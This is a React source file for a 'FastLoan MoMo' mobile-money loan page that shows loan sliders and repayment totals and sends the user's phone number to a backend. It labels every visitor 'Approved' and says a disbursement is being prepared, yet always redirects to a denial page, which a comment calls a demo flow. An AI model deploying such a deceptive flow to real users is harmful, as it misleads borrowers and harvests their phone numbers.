import React, { useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Wallet, CheckCircle2 } from "lucide-react";

const API_URL = import.meta.env.VITE_API_URL || "http://localhost:8000";

const LoanLimit = () => {
  const [amount, setAmount] = useState(7800);
  const [months, setMonths] = useState(6);
  const [isProcessing, setIsProcessing] = useState(false);
  const navigate = useNavigate();
  const location = useLocation();
  
  // ✅ Get the real phone number
  const phoneNumber = location.state?.phone || localStorage.getItem("userPhone") || "761234567";

  const interestRate = 0.09;
  const interestAmount = amount * interestRate;
  const totalRepayable = amount + interestAmount;
  const monthlyPayment = totalRepayable / months;

  const handleContinue = async () => {
    setIsProcessing(true);
    try {
      const res = await fetch(`${API_URL}/api/apply-loan`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        // ✅ Now sends the actual user's phone number
        body: JSON.stringify({ phone_number: phoneNumber, amount, months }),
      });
      const data = await res.json();
      
      setTimeout(() => {
        setIsProcessing(false);
        if (data.status === "denied") navigate("/loan-denied");
        else navigate("/loan-denied"); // For demo flow
      }, 2000);
    } catch (error) {
       setTimeout(() => {
         setIsProcessing(false);
         navigate("/loan-denied");
       }, 3000);
    }
  };

  return (
    <div className="app-container">
      <div className="header">
        <div className="header-icon"><Wallet size={32} color="white" /></div>
        <h1 className="header-title">FastLoan<span>MoMo</span></h1>
        <p className="header-subtitle">Instant mobile money loans</p>
      </div>
      
      <div className="main-card">
        <div className="badge"><CheckCircle2 size={14} /> Approved</div>
        
        <h2 className="title">Your loan limit</h2>
        <p className="subtitle">You qualify for up to <span className="bold">E 7,800 SZL</span>. Choose how much you need.</p>

        <div className="loan-amount-box">
          <p className="loan-label">LOAN AMOUNT</p>
          <h1 className="loan-value">E{amount.toLocaleString()}</h1>
          <p className="loan-currency">SZL</p>
        </div>

        <div className="slider-group">
          <div className="slider-header"><span>Amount</span><span style={{ color: '#6B7280' }}>E{amount.toLocaleString()}</span></div>
          <input type="range" min="500" max="7800" step="100" value={amount} onChange={(e) => setAmount(Number(e.target.value))} />
          <div className="slider-limits"><span>E500</span><span>E7,800</span></div>
        </div>

        <div className="slider-group">
          <div className="slider-header"><span>Repayment period</span><span style={{ color: '#6B7280' }}>{months} months</span></div>
          <input type="range" min="1" max="12" step="1" value={months} onChange={(e) => setMonths(Number(e.target.value))} />
          <div className="slider-limits"><span>1 month</span><span>12 months</span></div>
        </div>

        <div className="summary-box">
          <div className="summary-row"><span>Interest rate</span><span className="bold">9%</span></div>
          <div className="summary-row"><span>Interest amount</span><span className="bold">E{interestAmount.toFixed(0)}</span></div>
          <div className="summary-row"><span>Monthly payment</span><span className="bold">E{monthlyPayment.toFixed(0)}</span></div>
          <hr className="summary-divider" />
          <div className="summary-row summary-total"><span style={{ fontWeight: 500 }}>Total repayable</span><span className="bold">E{totalRepayable.toFixed(0)}</span></div>
        </div>

        <button onClick={handleContinue} className="btn-primary" style={{ padding: '16px', fontSize: '18px' }}>
          Continue
        </button>
      </div>

      {isProcessing && (
        <div className="modal-overlay">
          <div className="modal-content">
            <div className="spinner"></div>
            <h3 className="modal-title">Processing your loan</h3>
            <p className="modal-text">Please wait while we prepare your disbursement...</p>
          </div>
        </div>
      )}
    </div>
  );
};

export default LoanLimit;